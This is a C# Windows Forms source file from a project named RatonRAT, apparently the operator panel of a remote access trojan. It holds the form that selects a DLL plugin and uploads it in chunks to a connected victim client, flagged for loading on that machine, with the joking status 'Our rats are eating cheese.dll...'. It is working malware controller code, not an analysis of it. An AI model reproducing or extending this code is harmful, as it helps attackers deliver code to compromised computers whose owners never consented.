using Server.Connection;
using Stuff;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RatonRAT.ClientForms
{
    public partial class FormPlugin : Form
    {
        private bool isMouseDown = false;
        private Point mouseOffset;

        private void Form_MouseDown(object sender, MouseEventArgs e)
        {
            isMouseDown = true;
            mouseOffset = new Point(e.X, e.Y);
        }

        private void Form_MouseMove(object sender, MouseEventArgs e)
        {
            if (isMouseDown)
            {
                this.Location = new Point(this.Left + e.X - mouseOffset.X, this.Top + e.Y - mouseOffset.Y);
            }
        }

        private void Form_MouseUp(object sender, MouseEventArgs e)
        {
            isMouseDown = false;
        }
        public SillyClient SillyClient { get; set; }
        public FormPlugin()
        {
            InitializeComponent();
        }
        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Plugin (*.dll)|*.dll";
                openFileDialog.Title = "Seleccionar Plugin";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string path = openFileDialog.FileName;
                    FileInfo information = new FileInfo(path);
                    long size = information.Length;
                    string totalsize;

                    if (size >= 1024 * 1024)
                        totalsize = $"{size / 1024f / 1024f:F2}MB";
                    else if (size >= 1024)
                        totalsize = $"{size / 1024f:F2}KB";
                    else
                        totalsize = $"{size}B";

                    label4.Text = path;
                    label1.Text = information.Name;
                    label3.Text = $"Size: {totalsize}";
                }
            }
        }

        private void FormPlugin_Load(object sender, EventArgs e)
        {
            this.Paint += Form_Paint;
            this.MouseDown += Form_MouseDown;
            this.MouseMove += Form_MouseMove;
            this.MouseUp += Form_MouseUp;
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
            timer1.Start();
        }
        private void Form_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3))
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 25));
                }
            }
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }


        private void timer1_Tick(object sender, EventArgs e)
        {
            if (SillyClient == null || !SillyClient.isConnected())
            {
                this.Close();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (File.Exists(label4.Text))
            {
                string fileName = Path.GetFileName(label4.Text);
                string Duid = Helpers.Random();
                long fileSize = new FileInfo(label4.Text).Length;

                FormFile fileForm = (FormFile)Application.OpenForms["File ID: " + Duid];
                if (fileForm == null)
                {
                    fileForm = new FormFile
                    {
                        Name = "File ID: " + Duid,
                        Text = "File ID: " + Duid,
                        SillyClient = SillyClient,
                        UID = SillyClient.uid,
                        FileName = fileName,
                        FileSize = fileSize
                    };
                    fileForm.Show();

                    Task.Run(() =>
                    {
                        if (fileSize > 0)
                        {
                            Pack pack = null;
                            int count = 1;

                            if (fileSize < SillyClient.OneMb)
                            {
                                pack = new Pack();
                                pack.Set("Packet", "Upload");
                                pack.Set("isCompleted", false);
                                pack.Set("TempName", Helpers.MD5_STRING(Encoding.UTF8.GetBytes(fileName + Duid + count)));
                                pack.Set("FileBytes", File.ReadAllBytes(label4.Text));
                                SillyClient.Send(pack.Pacc());
                                fileForm.TotalFileSize += fileSize;
                            }
                            else
                            {
                                int bytesRead = 0;
                                long totalSize = fileSize;
                                byte[] buffer = new byte[SillyClient.OneMb];

                                using (Stream source = File.OpenRead(label4.Text))
                                {
                                    while (((bytesRead = source.Read(buffer, 0, buffer.Length)) > 0) && SillyClient.isConnected())
                                    {
                                        pack = new Pack();
                                        pack.Set("Packet", "Upload");
                                        pack.Set("isCompleted", false);
                                        pack.Set("TempName", Helpers.MD5_STRING(Encoding.UTF8.GetBytes(Path.GetFileName(label4.Text) + Duid + (count++).ToString())));
                                        pack.Set("FileBytes", buffer);
                                        SillyClient.Send(pack.Pacc());
                                        fileForm.TotalFileSize += buffer.Length;
                                        totalSize -= bytesRead;
                                        if (totalSize < SillyClient.OneMb)
                                            buffer = new byte[totalSize];
                                    }
                                }
                            }

                            pack = new Pack();
                            pack.Set("Packet", "Upload");
                            pack.Set("DUID", Duid);
                            pack.Set("isCompleted", true);
                            pack.Set("FileName", fileName);
                            pack.Set("FileSize", new FileInfo(label4.Text).Length);
                            pack.Set("FilePath", "TempClient");
                            pack.Set("isPlugin", true);
                            pack.Set("TempCount", count);
                            SillyClient.Send(pack.Pacc());
                        }

                        Thread.Sleep(800);
                        this.Invoke(new MethodInvoker(() => fileForm.progressBar1.Value = 100));
                        fileForm.timer2.Stop();
                        fileForm.Status("Our rats are eating cheese.dll...");
                    });
                }
            }
            else
            {
                MessageBox.Show("Error: Plugin.dll not found", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }
    }
}
